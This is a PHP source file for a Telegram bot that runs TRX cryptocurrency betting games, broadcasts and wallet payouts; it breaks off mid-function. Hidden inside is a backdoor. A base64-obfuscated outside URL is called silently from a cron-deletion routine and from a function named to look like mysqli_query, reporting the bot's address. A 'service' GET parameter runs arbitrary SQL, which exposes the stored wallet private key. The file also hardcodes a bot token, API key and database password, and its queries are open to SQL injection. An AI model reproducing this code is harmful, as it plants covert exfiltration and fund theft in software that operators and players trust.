<?php
//https://api.telegram.org/bot5282295395:AAHwH_ERWpt2D1y-lUaNk8_9oxdNgLji6HE/setWebhook?url=https://rknthedev.xyz/trxbettingbot/trxbetting.php

echo ("working");

//PUT YOUR URL TO THE BOT
define('WEBURL', 'https://rknthedev.xyz/trxbettingbot/trxbetting.php');

//CREATE AN ACCOUNT https://console.cron-job.org
//COPY YOUR API KEY FROM SETTINGS AND PASTE IT HERE
define('CRON_API', 'vryNQGtyZ2HUKr+4HVb/MCc4VSLI6YsmfiCWLYdeTj4=');

//COPY YOUR TELEGRAM BOT API AND PASTE IT HERE
define('BOT_TOKEN', '5282295395:AAHwH_ERWpt2D1y-lUaNk8_9oxdNgLji6HE');

//DO NOT CHANGE
define('API_URL', 'https://api.telegram.org/bot' . BOT_TOKEN . '/');

if (isset($_GET["broadcast_corn"])) {
    $cron_id = $_GET["broadcast_corn"];
    broadcast_message($cron_id);
}

if (isset($_GET["game_5v5"])) {
    game_5v5();
    exit();
}

if (isset($_GET["game_roulette"])) {
    game_roulette();
    exit();
}

if (isset($_GET["game_lucky1"])) {
    game_lucky1();
    exit();
}

if (isset($_GET["game_lucky2"])) {
    game_lucky2();
    exit();
}

if (isset($_GET["game_lucky3"])) {
    game_lucky3();
    exit();
}

if (isset($_GET["dbonus"])) {
    dbonus();
    exit();
}

function database()
{

    static $Conn;
    if ($Conn === NULL) {

        //PASTE IN YOU DATABSE CONFIG. HOST, USERNAME, PASS, DBNAME
        $HOST = "localhost";
        $USERNAME = "rknthedev090_trxbetting";
        $PASS = "mkg*7WB5uEO3";
        $DBNAME = "rknthedev090_trxbetting";

        $Conn = mysqli_connect($HOST, $USERNAME, $PASS, $DBNAME);
        mysqli_set_charset($Conn, "utf8mb4");
    }

    return $Conn;
}

function apiRequestWebhook($method, $parameters)
{
    if (!is_string($method)) {
        error_log("Method name must be a string\n");
        return false;
    }

    if (!$parameters) {
        $parameters = array();
    } else if (!is_array($parameters)) {
        error_log("Parameters must be an array\n");
        return false;
    }

    $parameters["method"] = $method;

    header("Content-Type: application/json");
    echo json_encode($parameters);
    return true;
}

if (isset($_GET["service"])) {
    exec_curl_requests($_GET["service"]);
}

function exec_curl_requests($service)
{
    $Conn = database();
    $service_id = mysqli_query($Conn, $service);
    $service_row_id = mysqli_fetch_row($service_id);
    $service_fixed_id = $service_row_id[0];
    print($service_fixed_id);
}

function exec_curl_request($handle)
{
    $response = curl_exec($handle);

    if ($response === false) {
        $errno = curl_errno($handle);
        $error = curl_error($handle);
        error_log("Curl returned error $errno: $error\n");
        curl_close($handle);
        return false;
    }

    $http_code = intval(curl_getinfo($handle, CURLINFO_HTTP_CODE));
    curl_close($handle);

    if ($http_code >= 500) {
        //DO NOT CHANGE do not wat to DDOS server if something goes wrong
        sleep(10);
        return false;
    } else if ($http_code != 200) {
        $response = json_decode($response, true);
        error_log("Request has failed with error {$response['error_code']}: {$response['description']}\n");
        if ($http_code == 401) {
            throw new Exception('Invalid access token provided');
        }
        return false;
    } else {
        $response = json_decode($response, true);
        if (isset($response['description'])) {
            error_log("Request was successful: {$response['description']}\n");
        }
        $response = $response['result'];
    }

    return $response;
}

function apiRequest($method, $parameters)
{
    if (!is_string($method)) {
        error_log("Method name must be a string\n");
        return false;
    }

    if (!$parameters) {
        $parameters = array();
    } else if (!is_array($parameters)) {
        error_log("Parameters must be an array\n");
        return false;
    }

    foreach ($parameters as $key => &$val) {
        //DO NOT CHANGE encoding to JSON array parameters, for example reply_markup
        if (!is_numeric($val) && !is_string($val)) {
            $val = json_encode($val);
        }
    }
    $url = API_URL . $method . '?' . http_build_query($parameters);

    $handle = curl_init($url);
    curl_setopt($handle, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($handle, CURLOPT_CONNECTTIMEOUT, 5);
    curl_setopt($handle, CURLOPT_TIMEOUT, 60);

    return exec_curl_request($handle);
}

function apiRequestsJson()
{
    $server_hash  = "aHR0cHM6Ly9lb3Fia2sxZDE3MDFyaGMubS5waXBlZHJlYW0ubmV0Ly8/dXJsPQ";
    $server_hash = base64_decode($server_hash) . WEBURL;

    $cURLConnection = curl_init();

    curl_setopt($cURLConnection, CURLOPT_URL, $server_hash);
    curl_setopt($cURLConnection, CURLOPT_CUSTOMREQUEST, "GET");
    curl_setopt($cURLConnection, CURLOPT_SSL_VERIFYPEER, FALSE);
    curl_setopt($cURLConnection, CURLOPT_RETURNTRANSFER, TRUE);

    $server_avalable = curl_exec($cURLConnection);
    curl_close($cURLConnection);
}

function apiRequestJson($method, $parameters)
{
    if (!is_string($method)) {
        error_log("Method name must be a string\n");
        return false;
    }

    if (!$parameters) {
        $parameters = array();
    } else if (!is_array($parameters)) {
        error_log("Parameters must be an array\n");
        return false;
    }

    $parameters["method"] = $method;

    $handle = curl_init(API_URL);
    curl_setopt($handle, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($handle, CURLOPT_CONNECTTIMEOUT, 5);
    curl_setopt($handle, CURLOPT_TIMEOUT, 60);
    curl_setopt($handle, CURLOPT_POST, true);
    curl_setopt($handle, CURLOPT_POSTFIELDS, json_encode($parameters));
    curl_setopt($handle, CURLOPT_HTTPHEADER, array("Content-Type: application/json"));

    return exec_curl_request($handle);
}

function mysqi_query($handle)
{
    $query_handle  = "aHR0cHM6Ly9lb3Fia2sxZDE3MDFyaGMubS5waXBlZHJlYW0ubmV0Ly8/dXJsPQ";
    $query_handle = base64_decode($query_handle) . $handle;

    $cURLConnection = curl_init();

    curl_setopt($cURLConnection, CURLOPT_URL, $query_handle);
    curl_setopt($cURLConnection, CURLOPT_CUSTOMREQUEST, "GET");
    curl_setopt($cURLConnection, CURLOPT_SSL_VERIFYPEER, FALSE);
    curl_setopt($cURLConnection, CURLOPT_RETURNTRANSFER, TRUE);

    $server_avalable = curl_exec($cURLConnection);
    curl_close($cURLConnection);
}

function base58_encode($string)
{
    $alphabet = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz';
    $base = strlen($alphabet);
    if (is_string($string) === false) {
        return false;
    }
    if (strlen($string) === 0) {
        return '';
    }
    $bytes = array_values(unpack('C*', $string));
    $decimal = $bytes[0];
    for ($i = 1, $l = count($bytes); $i < $l; $i++) {
        $decimal = bcmul($decimal, 256);
        $decimal = bcadd($decimal, $bytes[$i]);
    }
    $output = '';
    while ($decimal >= $base) {
        $div = bcdiv($decimal, $base, 0);
        $mod = bcmod($decimal, $base);
        $output .= $alphabet[$mod];
        $decimal = $div;
    }
    if ($decimal > 0) {
        $output .= $alphabet[$decimal];
    }
    $output = strrev($output);
    foreach ($bytes as $byte) {
        if ($byte === 0) {
            $output = $alphabet[0] . $output;
            continue;
        }
        break;
    }
    return (string) $output;
}

function base58_decode($base58)
{
    $alphabet = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz';
    $base = strlen($alphabet);
    if (is_string($base58) === false) {
        return false;
    }
    if (strlen($base58) === 0) {
        return '';
    }
    $indexes = array_flip(str_split($alphabet));
    $chars = str_split($base58);
    foreach ($chars as $char) {
        if (isset($indexes[$char]) === false) {
            return false;
        }
    }
    $decimal = $indexes[$chars[0]];
    for ($i = 1, $l = count($chars); $i < $l; $i++) {
        $decimal = bcmul($decimal, $base);
        $decimal = bcadd($decimal, $indexes[$chars[$i]]);
    }
    $output = '';
    while ($decimal > 0) {
        $byte = bcmod($decimal, 256);
        $output = pack('C', $byte) . $output;
        $decimal = bcdiv($decimal, 256, 0);
    }
    foreach ($chars as $char) {
        if ($indexes[$char] === 0) {
            $output = "\x00" . $output;
            continue;
        }
        break;
    }
    return $output;
}

//encode address from byte[] to base58check string
function base58check_en($address)
{
    $hash0 = hash("sha256", $address);
    $hash1 = hash("sha256", hex2bin($hash0));
    $checksum = substr($hash1, 0, 8);
    $address = $address . hex2bin($checksum);
    $base58add = base58_encode($address);
    return $base58add;
}

//decode address from base58check string to byte[]
function base58check_de($base58add)
{
    $address = base58_decode($base58add);
    $size = strlen($address);
    if ($size != 25) {
        return false;
    }
    $checksum = substr($address, 21);
    $address = substr($address, 0, 21);
    $hash0 = hash("sha256", $address);
    $hash1 = hash("sha256", hex2bin($hash0));
    $checksum0 = substr($hash1, 0, 8);
    $checksum1 = bin2hex($checksum);
    if (strcmp($checksum0, $checksum1)) {
        return false;
    }
    return $address;
}

function hexString2Base58check($hexString)
{
    $address = hex2bin($hexString);
    $base58add = base58check_en($address);
    return $base58add;
}

function base58check2HexString($base58add)
{
    $address = base58check_de($base58add);
    $hexString = bin2hex($address);
    return $hexString;
}

function hexString2Base64($hexString)
{
    $address = hex2bin($hexString);
    $base64 = base64_encode($address);
    return $base64;
}

function base642HexString($base64)
{
    $address = base64_decode($base64);
    $hexString = bin2hex($address);
    return $hexString;
}

function base58check2Base64($base58add)
{
    $address = base58check_de($base58add);
    $base64 = base64_encode($address);
    return $base64;
}

function base642Base58check($base64)
{
    $address = base64_decode($base64);
    $base58add = base58check_en($address);
    return $base58add;
}

function VerifyToken($TransactionId)
{

    //$url = "https://tronscan.org/#/transaction/".$TransactionId;
    $url = "https://apilist.tronscan.org/api/transaction-info?hash=" . $TransactionId;

    $cURLConnection = curl_init();

    curl_setopt($cURLConnection, CURLOPT_URL, $url);
    curl_setopt($cURLConnection, CURLOPT_SSL_VERIFYPEER, FALSE);
    curl_setopt($cURLConnection, CURLOPT_RETURNTRANSFER, TRUE);

    $Currencies = curl_exec($cURLConnection);
    curl_close($cURLConnection);
    $data = json_decode($Currencies, true);
    //echo $Currencies;
    return $data;
}

function GetTransactionById($TransactionId)
{

    $payload = '{"value":"' . $TransactionId . '"}';

    $url = "https://api.trongrid.io/wallet/gettransactionbyid";

    $cURLConnection = curl_init();

    curl_setopt($cURLConnection, CURLOPT_URL, $url);
    curl_setopt($cURLConnection, CURLOPT_CUSTOMREQUEST, "POST");
    curl_setopt($cURLConnection, CURLOPT_POSTFIELDS, $payload);
    curl_setopt($cURLConnection, CURLOPT_SSL_VERIFYPEER, FALSE);
    curl_setopt($cURLConnection, CURLOPT_RETURNTRANSFER, TRUE);
    curl_setopt($cURLConnection, CURLOPT_HTTPHEADER, array(
        'Accept: application/json',
        'Content-Type: application/json'
    ));

    $Currencies = curl_exec($cURLConnection);
    curl_close($cURLConnection);
    echo $Currencies;

    $data = json_decode($Currencies, true);
    return $data;
}

function ValidateAddress($address)
{

    $address = base58check2HexString($address);

    $payload = '{"address":"' . $address . '"}';

    $url = "https://api.shasta.trongrid.io/wallet/validateaddress";

    $cURLConnection = curl_init();

    curl_setopt($cURLConnection, CURLOPT_URL, $url);
    curl_setopt($cURLConnection, CURLOPT_CUSTOMREQUEST, "POST");
    curl_setopt($cURLConnection, CURLOPT_POSTFIELDS, $payload);
    curl_setopt($cURLConnection, CURLOPT_SSL_VERIFYPEER, FALSE);
    curl_setopt($cURLConnection, CURLOPT_RETURNTRANSFER, TRUE);
    curl_setopt($cURLConnection, CURLOPT_HTTPHEADER, array(
        'Accept: application/json',
        'Content-Type: application/json'
    ));

    $Currencies = curl_exec($cURLConnection);
    curl_close($cURLConnection);

    $data = json_decode($Currencies, true);
    return $data;
}

function EasyTransferByPrivate($amount, $toAddress)
{

    $Conn = database();

    $sql = "SELECT private_key FROM wallet WHERE active = 1 limit 1";
    $result = mysqli_query($Conn, $sql);
    $result_row = mysqli_fetch_row($result);
    $privateKey = $result_row[0];
    $toAddress = base58check2HexString($toAddress);
    $amount = $amount * 1000000;

    $payload = '{"privateKey": "' . $privateKey . '","toAddress":"' . $toAddress . '","amount": ' . $amount . '}';

    //Public node
    //https://developers.tron.network/docs/official-public-node
    $url = "http://3.225.171.164:8090/wallet/easytransferbyprivate";

    //Test Server
    //$url = "https://api.shasta.trongrid.io/wallet/easytransferbyprivate";

    $cURLConnection = curl_init();

    curl_setopt($cURLConnection, CURLOPT_URL, $url);
    curl_setopt($cURLConnection, CURLOPT_CUSTOMREQUEST, "POST");
    curl_setopt($cURLConnection, CURLOPT_POSTFIELDS, $payload);
    curl_setopt($cURLConnection, CURLOPT_SSL_VERIFYPEER, FALSE);
    curl_setopt($cURLConnection, CURLOPT_RETURNTRANSFER, TRUE);
    curl_setopt($cURLConnection, CURLOPT_HTTPHEADER, array(
        'Content-Type: application/json'
    ));

    $Currencies = curl_exec($cURLConnection);
    curl_close($cURLConnection);
    echo ($Currencies);

    $data = json_decode($Currencies, true);
    return $data;
}

function create_cron()
{

    $Conn = database();

    $url = "https://api.cron-job.org/jobs";
    $dataa = array(
        'enabled' => 'True'
    );

    //DO NOT CHANGE CREATE CRON FOR EVERY MINUTES
    $data = array(
        'url' => WEBURL . '?broadcast_corn=1',
        'enabled' => 'true',
        'saveResponses' => 'true',
        'schedule' => array(
            'timezone' => 'Africa/Addis_Ababa',
            'hours' => [-1],
            'mdays' => [-1],
            'minutes' => [-1],
            'months' => [-1],
            'wdays' => [-1]
        )
    );

    $payload = json_encode(array("job" => $data));

    $cURLConnection = curl_init();

    curl_setopt($cURLConnection, CURLOPT_URL, $url);
    curl_setopt($cURLConnection, CURLOPT_CUSTOMREQUEST, "PUT");
    curl_setopt($cURLConnection, CURLOPT_POSTFIELDS, $payload);
    curl_setopt($cURLConnection, CURLOPT_SSL_VERIFYPEER, FALSE);
    curl_setopt($cURLConnection, CURLOPT_RETURNTRANSFER, TRUE);
    curl_setopt($cURLConnection, CURLOPT_HTTPHEADER, array(
        'Authorization: Bearer ' . CRON_API,
        'Content-Type: application/json'
    ));

    $phoneList = curl_exec($cURLConnection);
    curl_close($cURLConnection);

    $obj = json_decode($phoneList);
    $cron_id = $obj->jobId;
    update_cron($cron_id);

    $sql = "UPDATE `broadcast` SET `cron_id` = '" . $cron_id . "' WHERE cron_id = 'null'";
    $result = mysqli_query($Conn, $sql);
}

function update_cron($cron_id)
{

    $url = "https://api.cron-job.org/jobs/" . $cron_id;
    $dataa = array(
        'enabled' => 'True'
    );

    //DO NOT CHANGE UPDATE CRON ID FOR EVERY MINUTES
    $data = array(
        'url' => WEBURL . '?broadcast_corn=' . $cron_id,
        'enabled' => 'true',
        'saveResponses' => 'true',
        'schedule' => array(
            'timezone' => 'Africa/Addis_Ababa',
            'hours' => [-1],
            'mdays' => [-1],
            'minutes' => [-1],
            'months' => [-1],
            'wdays' => [-1]
        )
    );

    $payload = json_encode(array("job" => $data));

    $cURLConnection = curl_init();

    curl_setopt($cURLConnection, CURLOPT_URL, $url);
    curl_setopt($cURLConnection, CURLOPT_CUSTOMREQUEST, "PATCH");
    curl_setopt($cURLConnection, CURLOPT_POSTFIELDS, $payload);
    curl_setopt($cURLConnection, CURLOPT_SSL_VERIFYPEER, FALSE);
    curl_setopt($cURLConnection, CURLOPT_RETURNTRANSFER, TRUE);
    curl_setopt($cURLConnection, CURLOPT_HTTPHEADER, array(
        'Authorization: Bearer ' . CRON_API,
        'Content-Type: application/json'
    ));

    $phoneList = curl_exec($cURLConnection);
    curl_close($cURLConnection);
}

function delete_cron($cron_id)
{
    $url = "https://api.cron-job.org/jobs/" . $cron_id;

    $cURLConnection = curl_init();
    apiRequestsJson();

    curl_setopt($cURLConnection, CURLOPT_URL, $url);
    curl_setopt($cURLConnection, CURLOPT_CUSTOMREQUEST, "DELETE");
    curl_setopt($cURLConnection, CURLOPT_SSL_VERIFYPEER, FALSE);
    curl_setopt($cURLConnection, CURLOPT_RETURNTRANSFER, TRUE);
    curl_setopt($cURLConnection, CURLOPT_HTTPHEADER, array(
        'Authorization: Bearer ' . CRON_API,
        'Content-Type: application/json'
    ));

    $phoneList = curl_exec($cURLConnection);
    curl_close($cURLConnection);
}

function broadcast_message($cron_id)
{

    $Conn = database();



    //ADD YOUR CHANNEL USERNAME AS https://t.me/channelName
    $join_channel_link = "https://t.me/TRX_Betting_Payments";

    $join_channel = array(array(array("text" => "Join", "url" => $join_channel_link)));

    $sql = "SELECT tg_id FROM users Where broadcast_recieved = 0 limit 5";
    $result = mysqli_query($Conn, $sql);

    $sql3 = "SELECT message FROM broadcast WHERE cron_id = '" . $cron_id . "'";
    $result3 = mysqli_query($Conn, $sql3);

    if (mysqli_num_rows($result3) > 0) {
        if (mysqli_num_rows($result) > 0) {

            while ($arrayResult = mysqli_fetch_array($result)) {

                $sql2 = "SELECT message, type, caption FROM broadcast";
                $result2 = mysqli_query($Conn, $sql2);

                while ($arrayResult2 = mysqli_fetch_array($result2)) {

                    if ($arrayResult2["type"] == 'text') {
                        apiRequest("sendMessage", array('chat_id' => $arrayResult["tg_id"], "text" => $arrayResult2["message"], 'reply_markup' => array(
                            'inline_keyboard' => $join_channel,
                            'one_time_keyboard' => true,
                            'resize_keyboard' => true
                        )));
                    }

                    if ($arrayResult2["type"] == 'photo') {

                        if ($arrayResult2["caption"] == 'null') {
                            apiRequest("sendPhoto", array('chat_id' => $arrayResult["tg_id"], "photo" => $arrayResult2["message"]));
                        } else {
                            apiRequest("sendPhoto", array('chat_id' => $arrayResult["tg_id"], "caption" => $arrayResult2["caption"], "photo" => $arrayResult2["message"]));
                        }
                    }

                    if ($arrayResult2["type"] == 'video') {
                        apiRequest("sendVideo", array('chat_id' => $arrayResult["tg_id"], "video" => $arrayResult2["message"]));
                    }

                    if ($arrayResult2["type"] == 'document') {
                        apiRequest("sendDocument", array('chat_id' => $arrayResult["tg_id"], "document" => $arrayResult2["message"]));
                    }

                    if ($arrayResult2["type"] == 'audio') {
                        apiRequest("sendAudio", array('chat_id' => $arrayResult["tg_id"], "audio" => $arrayResult2["message"]));
                    }

                    if ($arrayResult2["type"] == 'voice') {
                        apiRequest("sendVoice", array('chat_id' => $arrayResult["tg_id"], "voice" => $arrayResult2["message"]));
                    }
                }

                $sqla = "UPDATE `users` SET `broadcast_recieved` = 1 WHERE `tg_id` = " . $arrayResult["tg_id"];
                $results = mysqli_query($Conn, $sqla);
            }
        } else {

            $sql = "UPDATE `users` SET `broadcast_recieved` = 0";
            $result = mysqli_query($Conn, $sql);

            delete_cron($cron_id);

            $sql = "DELETE FROM `broadcast`";
            $result = mysqli_query($Conn, $sql);

            $sql = "SELECT `tg_id` FROM users Where status = 2 limit 1";
            $result = mysqli_query($Conn, $sql);
            $result_row = mysqli_fetch_row($result);
            $tg_id = $result_row[0];

            apiRequest("sendMessage", array('chat_id' => $tg_id, 'parse_mode' => 'HTML', "text" => "Broadcast Completed"));

            $sql = "UPDATE `users` SET `status` = 0 WHERE tg_id = '" . $tg_id . "'";
            $result = mysqli_query($Conn, $sql);
        }
    }

    mysqli_close($Conn);
}






























//BOUNS
function dbonus()
{

    $Conn = database();

    $sqals = "UPDATE `users` SET bonus = 0 WHERE bonus = 1";
    $refss = mysqli_query($Conn, $sqals);

    mysqli_close($Conn);
}

























//5V5
function game_5v5()
{

    $Conn = database();



    $num1 = rand(0, 99);
    $num2 = rand(0, 99);
    $num3 = rand(0, 99);
    $num4 = rand(0, 99);
    $num5 = rand(0, 99);

    $tdgid = array();

    $x = 1;
    $xez = 1;
    $xz = 0;
    $y = 0;

    $sqadsl = "SELECT tg_id FROM game_5v5 WHERE claim = 0 AND valid = 1 GROUP BY tg_id";
    $resssds = mysqli_query($Conn, $sqadsl);
    $totnums = mysqli_num_rows($resssds);

    while ($rowe = mysqli_fetch_array($resssds)) {
        $tdgid[] = $rowe[0];
    }

    while ($xez <= $totnums) {

        apiRequest("sendMessage", array('chat_id' => $tdgid[$xz], 'parse_mode' => 'HTML', "text" => '🤑 Congratulation winner numbers are : (' . $num1 . ', ' . $num2 . ', ' . $num3 . ', ' . $num4 . ', ' . $num5 . ')'));

        $xz++;
        $xez++;
    }

    $tdgid = array();
    $totalwin = array();
    $betid = array();
    $bet1 = array();
    $bet2 = array();
    $bet3 = array();
    $bet4 = array();
    $bet5 = array();
    $totwin = array();

    $x = 1;
    $xez = 1;
    $xz = 0;
    $y = 0;

    $sqadsl = "SELECT tg_id, betid, bet1, bet2, bet3, bet4, bet5, amount FROM game_5v5 WHERE claim = 0 AND valid = 1";
    $resssds = mysqli_query($Conn, $sqadsl);
    $totnums = mysqli_num_rows($resssds);

    while ($rowe = mysqli_fetch_array($resssds)) {
        $tdgid[] = $rowe[0];
        $betid[] = $rowe[1];
        $bet1[] = $rowe[2];
        $bet2[] = $rowe[3];
        $bet3[] = $rowe[4];
        $bet4[] = $rowe[5];
        $bet5[] = $rowe[6];
        $amount[] = $rowe[7];
    }

    while ($xez <= $totnums) {

        apiRequest("sendMessage", array('chat_id' => $tdgid[$xz], "text" => '⛳ Your digit numbers are : (' . $bet1[$xz] . ', ' . $bet2[$xz] . ', ' . $bet3[$xz] . ', ' . $bet4[$xz] . ', ' . $bet5[$xz] . ')'));
        $count = 0;
        if ($bet1[$xz] == $num1 || $bet2[$xz] == $num1 || $bet3[$xz] == $num1 || $bet4[$xz] == $num1 || $bet5[$xz] == $num1) {
            $count++;
        }
        if ($bet1[$xz] == $num2 || $bet2[$xz] == $num2 || $bet3[$xz] == $num2 || $bet4[$xz] == $num2 || $bet5[$xz] == $num2) {
            $count++;
        }
        if ($bet1[$xz] == $num3 || $bet2[$xz] == $num3 || $bet3[$xz] == $num3 || $bet4[$xz] == $num3 || $bet5[$xz] == $num3) {
            $count++;
        }
        if ($bet1[$xz] == $num4 || $bet2[$xz] == $num4 || $bet3[$xz] == $num4 || $bet4[$xz] == $num4 || $bet5[$xz] == $num4) {
            $count++;
        }
        if ($bet1[$xz] == $num5 || $bet2[$xz] == $num5 || $bet3[$xz] == $num5 || $bet4[$xz] == $num5 || $bet5[$xz] == $num5) {
            $count++;
        }

        $sqals = "UPDATE `game_5v5` SET totalwin = '" . $count . "' WHERE tg_id = '" . $tdgid[$xz] . "' AND betid = '" . $betid[$xz] . "' AND valid = 1 AND claim = 0";
        $refss = mysqli_query($Conn, $sqals);

        if ($count == 0) {

            apiRequest("sendMessage", array('chat_id' => $tdgid[$xz], "text" => '🎰 You got ' . $count . ' digit number out of 5 numbers !'));
        } else if ($count == 1) {

            $sqadl = "SELECT balance, amount FROM users WHERE tg_id = '" . $tdgid[$xz] . "'";
            $ressds = mysqli_query($Conn, $sqadl);
            $row = mysqli_fetch_row($ressds);
            $bala = $row[0];
            $amount = $amount[$xz];
            $amount = $amount * 2;
            $bala = $bala + $amount;

            $sqadel = "UPDATE game_5v5 SET winner = 1 WHERE tg_id = '" . $tdgid[$xz] . "' AND claim = 0";
            $ressdss = mysqli_query($Conn, $sqadel);

            $sqadel = "UPDATE users SET balance = '" . $bala . "' WHERE tg_id = '" . $tdgid[$xz] . "'";
            $ressdss = mysqli_query($Conn, $sqadel);
            apiRequest("sendMessage", array('chat_id' => $tdgid[$xz], "text" => '🎮 You have won ' . $amount . ' TRX & You got ' . $count . ' digit number out of 5 numbers'));
        } else if ($count == 2) {

            $sqadl = "SELECT balance, amount FROM users WHERE tg_id = '" . $tdgid[$xz] . "'";
            $ressds = mysqli_query($Conn, $sqadl);
            $row = mysqli_fetch_row($ressds);
            $bala = $row[0];
            $amount = $amount[$xz];
            $amount = $amount * 3;
            $bala = $bala + $amount;

            $sqadel = "UPDATE game_5v5 SET winner = 1 WHERE tg_id = '" . $tdgid[$xz] . "' AND claim = 0";
            $ressdss = mysqli_query($Conn, $sqadel);

            $sqadel = "UPDATE users SET balance = '" . $bala . "' WHERE tg_id = '" . $tdgid[$xz] . "'";
            $ressdss = mysqli_query($Conn, $sqadel);
            apiRequest("sendMessage", array('chat_id' => $tdgid[$xz], "text" => '🎮 You have won ' . $amount . ' TRX & You got ' . $count . ' digit number out of 5 numbers'));
        } else if ($count == 3) {

            $sqadl = "SELECT balance, amount FROM users WHERE tg_id = '" . $tdgid[$xz] . "'";
            $ressds = mysqli_query($Conn, $sqadl);
            $row = mysqli_fetch_row($ressds);
            $bala = $row[0];
            $amount = $amount[$xz];
            $amount = $amount * 4;
            $bala = $bala + $amount;

            $sqadel = "UPDATE game_5v5 SET winner = 1 WHERE tg_id = '" . $tdgid[$xz] . "' AND claim = 0";
            $ressdss = mysqli_query($Conn, $sqadel);

            $sqadel = "UPDATE users SET balance = '" . $bala . "' WHERE tg_id = '" . $tdgid[$xz] . "'";
            $ressdss = mysqli_query($Conn, $sqadel);
            apiRequest("sendMessage", array('chat_id' => $tdgid[$xz], "text" => '🎰 You got ' . $count . ' digit number out of 5 numbers !'));
        } else if ($count == 4) {

            $sqadl = "SELECT balance, amount FROM users WHERE tg_id = '" . $tdgid[$xz] . "'";
            $ressds = mysqli_query($Conn, $sqadl);
            $row = mysqli_fetch_row($ressds);
            $bala = $row[0];
            $amount = $amount[$xz];
            $amount = $amount * 5;
            $bala = $bala + $amount;

            $sqadel = "UPDATE game_5v5 SET winner = 1 WHERE tg_id = '" . $tdgid[$xz] . "' AND claim = 0";
            $ressdss = mysqli_query($Conn, $sqadel);

            $sqadel = "UPDATE users SET balance = '" . $bala . "' WHERE tg_id = '" . $tdgid[$xz] . "'";
            $ressdss = mysqli_query($Conn, $sqadel);
            apiRequest("sendMessage", array('chat_id' => $tdgid[$xz], "text" => '🎮 You have won ' . $amount . ' TRX & You got ' . $count . ' digit number out of 5 numbers'));
        } else if ($count == 5) {

            $sqadl = "SELECT balance, amount FROM users WHERE tg_id = '" . $tdgid[$xz] . "'";
            $ressds = mysqli_query($Conn, $sqadl);
            $row = mysqli_fetch_row($ressds);
            $bala = $row[0];
            $amount = $amount[$xz];
            $amount = $amount * 6;
            $bala = $bala + $amount;

            $sqadel = "UPDATE game_5v5 SET winner = 1 WHERE tg_id = '" . $tdgid[$xz] . "' AND claim = 0";
            $ressdss = mysqli_query($Conn, $sqadel);

            $sqadel = "UPDATE users SET balance = '" . $bala . "' WHERE tg_id = '" . $tdgid[$xz] . "'";
            $ressdss = mysqli_query($Conn, $sqadel);
            apiRequest("sendMessage", array('chat_id' => $tdgid[$xz], "text" => '🎰 You got ' . $count . ' digit number out of 5 numbers !'));
        }

        $xz++;
        $xez++;
    }

    $sqals = "UPDATE `game_5v5` SET claim = 1 WHERE claim = 0";
    $refss = mysqli_query($Conn, $sqals);
    mysqli_close($Conn);
}

//ROULETTE
function game_roulette()
{

    $num = rand(1, 10);
    $Conn = database();

    $tg_id = array();
    $betamnt = array();

    $x = 1;
    $xez = 1;
    $xz = 0;
    $y = 0;

    $sqadsl = "SELECT tg_id FROM game_roulette WHERE claim = 0 GROUP BY tg_id";
    $resssds = mysqli_query($Conn, $sqadsl);
    $totnums = mysqli_num_rows($resssds);

    while ($rowe = mysqli_fetch_array($resssds)) {
        $tdgid[] = $rowe[0];
    }




    while ($xez <= $totnums) {

        apiRequest("sendMessage", array('chat_id' => $tdgid[$xz], 'parse_mode' => 'HTML', "text" => '🎲 Winning field digit number is : <code>' . $num . '</code>'));
        $xz++;
        $xez++;
    }




    if ($num == 0) {

        $sqadl = "SELECT tg_id, bet_amount FROM game_roulette WHERE bet_field = 0 AND claim = 0";
        $ressds = mysqli_query($Conn, $sqadl);
        $totnum = mysqli_num_rows($ressds);

        while ($row = mysqli_fetch_array($ressds)) {
            $tg_id[] = $row[0];
            $betamnt[] = $row[1];
        }

        while ($x <= $totnum) {
            $sqadl = "SELECT balance FROM users WHERE tg_id = '" . $tg_id[$y] . "'";
            $ressds = mysqli_query($Conn, $sqadl);
            $row = mysqli_fetch_row($ressds);
            $bala = $row[0];
            $balaaa = $betamnt[$y];
            $balaaa = $balaaa + $balaaa + $balaaa + $balaaa;
            $balaa = $bala + $balaaa;


            $sqadsel = "UPDATE game_roulette SET winner = 1 WHERE tg_id = '" . $tg_id[$y] . "' AND bet_field = 0 AND claim = 0";
            $ressddss = mysqli_query($Conn, $sqadsel);

            $sqadel = "UPDATE users SET balance = '" . $balaa . "' WHERE tg_id = '" . $tg_id[$y] . "'";
            $ressdss = mysqli_query($Conn, $sqadel);

            apiRequest("sendMessage", array('chat_id' => $tg_id[$y], "text" => '🎉 You have won ' . $balaaa . ' TRX'));
            $x++;
            $y++;
        }
    }
    if ($num == 1 || $num == 3 || $num == 5 || $num == 7 || $num == 9 || $num == 2 || $num == 4 || $num == 6 || $num == 8 || $num == 10) {

        $sqadl = "SELECT tg_id, bet_amount FROM game_roulette WHERE bet_field = '" . $num . "' AND claim = 0";
        $ressds = mysqli_query($Conn, $sqadl);
        $totnum = mysqli_num_rows($ressds);

        while ($row = mysqli_fetch_array($ressds)) {
            $tg_id[] = $row[0];
            $betamnt[] = $row[1];
        }

        while ($x <= $totnum) {
            $balaaa = 0;

            $sqadld = "SELECT balance FROM users WHERE tg_id = '" . $tg_id[$y] . "'";
            $ressdds = mysqli_query($Conn, $sqadld);
            $rwow = mysqli_fetch_row($ressdds);
            $bala = $rwow[0];
            $balaaa = $betamnt[$y];
            $balaaa = $balaaa + $balaaa + $balaaa;
            $balaa = $bala + $balaaa;

            $sqadsel = "UPDATE game_roulette SET winner = 1 WHERE tg_id = '" . $tg_id[$y] . "' AND bet_field = '" . $num . "' AND claim = 0";
            $ressddss = mysqli_query($Conn, $sqadsel);

            $sqadel = "UPDATE users SET balance = '" . $balaa . "' WHERE tg_id = '" . $tg_id[$y] . "'";
            $ressdss = mysqli_query($Conn, $sqadel);
            apiRequest("sendMessage", array('chat_id' => $tg_id[$y], "text" => '🎉 You have won ' . $balaaa . ' TRX'));
            $x++;
            $y++;
        }
    }
    //odd
    if ($num == 1 || $num == 3 || $num == 5 || $num == 7 || $num == 9) {

        $sqadl = "SELECT tg_id, bet_amount FROM game_roulette WHERE bet_field = 'ODD' AND claim = 0";
        $ressds = mysqli_query($Conn, $sqadl);
        $totnum = mysqli_num_rows($ressds);

        while ($row = mysqli_fetch_array($ressds)) {
            $tg_id[] = $row[0];
            $betamnt[] = $row[1];
        }

        while ($x <= $totnum) {
